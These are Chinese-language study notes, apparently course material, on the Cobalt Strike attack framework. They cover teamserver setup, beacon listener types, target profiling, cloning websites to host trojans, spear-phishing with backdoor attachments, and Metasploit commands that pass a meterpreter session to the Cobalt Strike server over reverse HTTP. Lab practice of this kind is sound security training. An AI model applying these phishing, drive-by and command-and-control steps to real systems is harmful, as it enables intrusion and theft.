# 参考文献(Gitbook)
[https://wbglil.gitbook.io/cobalt-strike/cobalt-strikeji-ben-shi-yong](https://wbglil.gitbook.io/cobalt-strike/cobalt-strikeji-ben-shi-yong)

# 课件
[CobaltStrike笔记new.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/26140423/1673879297688-82050992-c39b-44b3-8f62-a9741e3b71ad.pdf)


# 简介
> Cobalt Strike简称CS,  用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这在一个团队服务器上共享目标资源和信息


# 特点

1. 有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等
2. 支持钓鱼攻击，可自动化挂马链接生成
3. 很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等

# 区分CS的部署-----客户端和服务端

Cobalt Strike 分为服务端和客户端
**服务端 **可以部署在**远程服务器**下或者 部署在kaili里;
**客户端** 可以部署到**本地** , 支持linux和windows系统.

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116225035229.png#id=Ql6be&originHeight=147&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
> 可以支持 N个客户端.


# Cobalt Strike 安装与环境配置（kali）
# 准备环境 ：

1.  软件: Cobalt Strike 
2.  jdk11（**如果使用kali 则不需要另外安装jdk**） 
> jdk 不是11 也行, 我用的是17


## 其他linux系统安装jdk

### 使用 APT 安装 OpenJDK 11：

1. 输入:
```
sudo apt-get update

#或者
apt-get update
```

2. 安装 OpenJDK 11：
```
sudo apt-get install openjdk-11-jdk


# 或者输入
apt-get install openjdk-11-jdk
```

3. 将 OpenJDK 11 设置为默认 Java 程序：
```
sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
```

```
# 或者
update-java-alternatives -s java-1.11.0-openjdk-amd64
```

# 安装

## 在kali中安装CS

1. 在window 11 下, 解压好CS, 将其直接拖进丢进 kali 中, 就行.

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116225526774.png#id=WnzBs&originHeight=246&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 在Windows中安装CS
## 安装jdk
参考自己的51CTO的博客:
[https://blog.51cto.com/u_15936127/6001778](https://blog.51cto.com/u_15936127/6001778)

### 下载CS
> 接着 直接下载CS就行.(建议不要下载到物理机, 因为CS有后门, 最好下载到虚拟机)


# CS目录介绍
```
# CS Windows客户端启动程序(中文)
cobaltstrike_cn.bat 

# CS Windows客户端启动程序(英文)
 cobaltstrike_en.bat 
# 主体程序
 cobaltstrike.jar 
 
# 翻译插件
cobaltStrikeCN.jar

# Linux服务端启动程序(linux shell脚本)
teamserver

# Windows服务端启动程序(windows bat批处理)
teamserver.bat

# 第三方工具 ,vnc远程功能的dll
third-party

# README.vncdll.txt
 
 
# vnc服务端dllx64位
winvnc.x64.dll 

vnc服务端dllx86位
winvnc.x86.dll 

# 一些脚本文件
Win_Linux shell script.7z 
```

# 启动CS
## kali中启动CS的方式
1.在安装了CS的目录下, 输入:
```
./teamserver  自己电脑的ip 自己对边设置一个密码
```
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116231631908.png#id=YxM5J&originHeight=25&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

> **注意:**

```
# 没有权限, 就提权
chmod 777 teamserver

#不要输入错误ip

# 一定要在安装了CS的目录下执行
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116230202077.png#id=IEbGx&originHeight=285&originWidth=526&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2. 输入:
```
./cobaltstrike
```
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116231823183.png#id=ep7Ta&originHeight=48&originWidth=464&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116232119722.png#id=WlfLU&originHeight=427&originWidth=577&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
> **注意: 端口, 和 ssl 就是刚才 ./cobaltstrike的时候出现的**


![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230116232221159.png#id=swKnO&originHeight=496&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

> 成功进入!




## Cobalt Strike客户端连接团队服务（Windows）

**注意Cobalt Strike这款软件最好在虚拟机内执行避免后门反噬主机**

解压CS安装包
![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/0793bde1003d48edb588f9a0fc4744e9.png#id=OJdqM&originHeight=345&originWidth=1100&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

启动方法1 直接管理员方式执行 cobaltstrike.bat

启动方法2 在CMD中运行，注意CMD也要管理员权限

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/6df02bf4c9284e80a103c3d32bf246f5.png#id=cKCp1&originHeight=217&originWidth=567&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/a3f4f23a27e343248963b40253202635.png#id=SQXui&originHeight=267&originWidth=721&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/bbfad5cfef1e4eceb6199c330cc0a46b.png#id=vezUL&originHeight=377&originWidth=611&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

启动CS完成后根据服务器配置输入IP ，端口，用户名，密码

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/674fa8a677b64d738f83550ee9690670.png#id=UtaNQ&originHeight=200&originWidth=587&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

看到服务器指纹确认点Yes  服务器指纹应与服务启动时一样

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/541c0b6de1fd45eda97084a4cc21b7a9.png#id=q0mAG&originHeight=528&originWidth=1903&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/d8fdbc51c0194cc1966e3df1daef5e3f.png#id=FHya6&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

---

# Cobalt Strik功能介绍
![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673884074314-f967e26b-db3c-4c8e-a83b-6d93e3d0f2b2.png?x-oss-process=image%2Fresize%2Cw_649%2Climit_0#averageHue=%23dedcd3&from=url&id=nnUEn&originHeight=717&originWidth=649&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/df5f3a99e4f34d37addae0a7add4744a.png#id=YoAj1&originHeight=32&originWidth=499&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

图标栏功能说明

1 添加新的 Cobalt Strik 团队服务器

2 删除当前 Cobalt Strik 团队服务器

3 新建一个监听器

4 切换图形会话按钮

5 切换列表会话按钮

6  以列表方式显示目标

7 密码凭证栏按钮

8 下载文件列表

9 键盘记录表

10 屏幕截图表

11 生成Windows下可执行木马

12 生成java签名applet攻击

13 生成office 宏攻击

14 生成powershell后门

15  文件托管按钮

16 管理web站点

17 帮助文档

18 关于

# 创建一个监控
# 示例:
> 暂略

## **监控器链接方式简介**

beacon是cs内置的监听器，当我们在目标机器上成功执行Payload后，会返回一个shell发送到cs上。

foreign主要是提供给cs外的工具使用的监听器，例如派生出来msf的shell来进行后渗透。

External C2 是 cs引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 http，https，dns，smb tcp 通道。大家可以参考 [此处](https://www.cobaltstrike.com/downloads/externalc2spec.pdf) 下载完整的规范说明。

简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：

- 第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。
- 第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。
- SMB Beacon：在受害者主机上执行的标准 beacon。

## **Beacon分类**

**Beacon是Cobalt Strike运行在目标主机上的payload，Beacons是在隐蔽信道上给我们提供服务，用于长期控制受感染主机** 。它的工作方式与Metasploit类似。在实际渗透过程中，我们可以将其 **嵌入到可执行文件** 、**添加到Word文档**或者通过**利用主机漏洞**来传递Beacon。

1. DNS Beacon
2. HTTP 和 HTTPS Beacon
3. SMB Beacon
4. TCP Beacon

## DNS Beacon

DNS Beacon，就是使用DNS请求将Beacon返回。DNS 请求用于解析由你的 CS 团队服务器

DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务

注意：

在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式

DNS Beacon优点：

拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/24a63e41aa7446c48a138e56a7a0b282.png#id=mGmM6&originHeight=680&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## HTTP 和 HTTPS Beacon

HTTP Beacon 利用http请求来进行通信来向受害主机传达命令，达到控制对方主机的目的。缺点是明文传输。

HTTPS Beacon 增加了加密传输，其余跟http完全相同。

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/490042b5c64d41cbba7712d349202a15.png#id=gmVKT&originHeight=658&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## SMB Beacon

**官网的解释为** ：_SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。_

以上的说法，其实就是将 `Payload` 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/36f68a11068245a5a5c5767802ee4e9f.png#id=MWklc&originHeight=718&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## TCP Beacon

TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是使用TCP socket进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的流量都是明文的，容易被发现但是这个技术，很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。

点击![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/4d82efac16c54a67b750be2e4cfe5360.png#id=iJiva&originHeight=28&originWidth=37&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)或 点击监听器

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/d0c92611818942deaf90391569c9a856.png#id=LDrRD&originHeight=278&originWidth=219&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/6e3bf526c9f74669a51a578b06375eee.png#id=qmp5r&originHeight=669&originWidth=1193&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1985/1647858582045/492cc938cbe843168614f1fb19a5c4c4.png#id=SAyES&originHeight=609&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

# Cobalt Strik 目标主机信息收集

1. 开启CS
2. 找到 Web Drive by ----> System Profilter.
3. 配置一些参数

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966406680-2163d5b4-d82f-4100-90b1-8fde37a49cf2.png#averageHue=%23b7f1f6&clientId=u3d0ce0a8-441e-4&from=paste&id=u5ca9013c&originHeight=299&originWidth=386&originalType=url&ratio=1&rotation=0&showTitle=false&size=29253&status=done&style=none&taskId=u0fc0e1be-f771-4e04-ac8b-f6aa9655656&title=)
然后**Launch** , ok

1. 配置信息收集 有4个参数可以设置 分别为 本地URL 本地Host 本地端口 跳转URL
2. 本地URL 配置的参数是访问ip后面的参数
3. 本地Host 是当前Cobalt Strik服务器的内网或公网IP
4. 本地端口 默认是80 如果80被占用了就需要设置其他的 如 81 82 83 都可以
5. 跳转URL 默认可不设置跳转

在靶机上访问(在自己的攻击机上访问也行)
没啥变化

1. 查看收集到的信息

找到最上方菜单栏的 View------------> Weblog
注意: 绿色加号处, 就是信息啦!
Cobalt Strik内置信息收集模块 可以收集 目标主机的操作系统版本 系统位数 浏览器 版本 位数
方便攻击者针对性攻击
# Cobalt Strik 克隆网页并挂马
## 克隆网页
在最上方的 菜单栏找到:
> **Attack ---------> Web Drive by ---------> Clone Site**

## 配置网站克隆
克隆URL 输入http网站链接
本地URL 配置的参数是访问ip后面的参数
本地Host 是当前Cobalt Strik服务器的内网或公网IP
本地端口 默认是80 如果80被占用了就需要设置其他的 如 81 82 83 都可以
攻击地址 ： 默认不配置
配置完成后访问 本地host地址
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966412946-421bd368-732c-4ded-9567-607ce4829760.png#averageHue=%2341715a&clientId=u3d0ce0a8-441e-4&from=paste&id=u1a9fefd3&originHeight=701&originWidth=1060&originalType=url&ratio=1&rotation=0&showTitle=false&size=427043&status=done&style=none&taskId=ubba805a8-042c-4310-928f-c186ec3cd7b&title=)
## 进行挂马
在最上方的 菜单栏找到:
> **Attack ---------> Web Drive by ------------> Manage**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966640370-ef4b0242-c34e-44f6-8254-264e0c7dc36a.png#averageHue=%23abb29d&clientId=u3d0ce0a8-441e-4&from=paste&height=532&id=uf144a42d&originHeight=599&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159194&status=done&style=none&taskId=uee91a19c-7efb-49f0-a8cf-75c27ab9825&title=&width=808.8888888888889)
先建立 Liston, 然后建立, windows的payload
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966407027-488e0eca-ea36-46cc-9f85-2ff5c98d1e46.png#averageHue=%23cde9e1&clientId=u3d0ce0a8-441e-4&from=paste&id=u8e060e60&originHeight=289&originWidth=424&originalType=url&ratio=1&rotation=0&showTitle=false&size=31761&status=done&style=none&taskId=u9218d638-3d91-4dd3-9f51-19839ce0a5e&title=)
Local URL可以改一下 文件的
> **接着找到 Attack -------> WebDrive by -------> Host File**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966407040-4b16f758-3b95-40dc-b7ae-120ab4bba534.png#averageHue=%23b6e8e9&clientId=u3d0ce0a8-441e-4&from=paste&id=u7572652d&originHeight=302&originWidth=418&originalType=url&ratio=1&rotation=0&showTitle=false&size=33579&status=done&style=none&taskId=u9e98820d-6938-406d-8b1a-a2412076a61&title=)
注意:路径中的最后的那个文件名字是自己取得
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673966413920-20dd2bb7-faa9-4a3e-8bba-afc37608b112.png#averageHue=%231f3d4e&clientId=u3d0ce0a8-441e-4&from=paste&id=u8475d9fe&originHeight=433&originWidth=1222&originalType=url&ratio=1&rotation=0&showTitle=false&size=494584&status=done&style=none&taskId=u1fa6993f-1a3e-4c64-b493-9691d87eff7&title=)
```
克隆URL  输入http网站链接
 
 本地URL    配置的参数是访问ip后面的参数
 
 本地Host   是当前Cobalt Strik服务器的内网或公网IP
 
 本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以
```
**复制,选择一个已经配置好的后面下载链接** 
> **地址为: 配置完成后访问 本地host地址+ 参数 mb**

# 

# 邮件钓鱼
> **提前准备一个邮箱**

> **Attack-------> Spear Phfish**

# Cobalt Strik 邮件钓鱼
1 准备一个邮箱用于发送邮件
这边拿QQ邮箱为例 点击设置然后点击 账户
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673967284232-df41d90e-fa9a-490e-a9c8-24df202b66cf.png#averageHue=%23f0f0f0&clientId=u28251994-4acc-4&from=paste&id=u5b97520c&originHeight=645&originWidth=1000&originalType=url&ratio=1&rotation=0&showTitle=false&size=95180&status=done&style=none&taskId=uc569b2f3-e8bb-4e5c-a62e-831f4e725d6&title=)
找到 IMAP/SMTP服务 点击开启服务 获取 授权码 （获取后把这个授权码先记录下来）
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673967284238-5d815050-2af0-4178-97d8-69ccc980e01d.png#averageHue=%23edebeb&clientId=u28251994-4acc-4&from=paste&id=u524e1167&originHeight=452&originWidth=1332&originalType=url&ratio=1&rotation=0&showTitle=false&size=62429&status=done&style=none&taskId=uf7d6fee9-3854-465a-b6b4-d4f35413ec7&title=)
然后回到CS中 进入邮件钓鱼
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673967284196-7a98c738-287a-4dee-b070-c31952e90383.png#averageHue=%23d0dcea&clientId=u28251994-4acc-4&from=paste&id=u48349071&originHeight=305&originWidth=331&originalType=url&ratio=1&rotation=0&showTitle=false&size=30505&status=done&style=none&taskId=u0bac553b-cd68-4831-be0b-dd5c3704f82&title=)
邮件钓鱼配置参数如下
目标 ：这里指的是接收邮件的号码
模板：邮件的格式个内容
附件： 可以加入后门程序或其他 或者不加
嵌入URL : 可以选择配置好的网站放进去
邮件服务器：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673967284243-9cea4c65-8f0b-4cc6-998a-b9f2569c9a6d.png#averageHue=%23d0e1de&clientId=u28251994-4acc-4&from=paste&id=uad087d9e&originHeight=425&originWidth=574&originalType=url&ratio=1&rotation=0&showTitle=false&size=66739&status=done&style=none&taskId=u77b90ae9-ab70-4ba5-9883-6dce52d4703&title=)
退信通知邮箱 可以填写任意可接受邮件的邮箱
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673967284331-322dc494-e574-49af-b7c1-62ea738bba93.png#averageHue=%23c6e5e6&clientId=u28251994-4acc-4&from=paste&id=ua629347e&originHeight=654&originWidth=873&originalType=url&ratio=1&rotation=0&showTitle=false&size=98520&status=done&style=none&taskId=u913b0752-258e-4a5c-8812-a4a761df39c&title=)
所有参数配置完成后 点击 Send 发送邮件即可
> **注意: 如果虚假的网站连接没跟上, 可以在 Manage 里面复制虚假网站地址, 再次向 靶机邮箱发送邮件, 补上**


# 使用CS进行监控
> **前提:**
> **已经使用msf 渗透进入到了靶机, 正在使用meterpreter**

```
# 后台查看当前的session
background
```

1. 加载MSF的payload 注入功能
```
use exploit/windows/local/payload_inject
```

2. 设置payload
```
set payload windows/meterpreter/reverse_http
```

3. 查看配置参数
```
show options
```
```
set lhost 对应CS的teamserver的ip
```
```
set lport cs的监听端口(只要没被占用就行)
```

4. 设置监控会话
```
set session 数字(当前对应的session)
```

5. 设置当前msf不接受监听数据
```
set disablepayloadhander true
```

6. 执行设置
```
run
```
OK啦

> 如果还是没有传到CS, 不妨再次run






